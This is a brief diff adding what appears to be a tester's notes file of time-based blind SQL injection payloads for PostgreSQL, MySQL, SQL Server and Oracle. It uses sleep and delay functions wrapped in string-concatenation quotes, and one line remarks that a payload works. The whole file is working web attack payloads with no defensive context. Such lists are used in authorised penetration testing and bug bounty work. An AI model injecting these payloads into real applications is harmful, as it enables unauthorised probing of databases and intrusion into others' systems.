@@ -1,0 +1,13 @@
+#Step 1:
+
+Hidden trials
+
+'|| pg_sleep(10) ||'			[this works for me.]
+'|| sleep(10) ||'
+'||WAITFOR DELAY '0:0:10' ||'
+'|| dbms_pipe.receive_message(('a'),10) ||'
+
+
+Also try these queries like this :-
+
+'|| pg_sleep(10) --
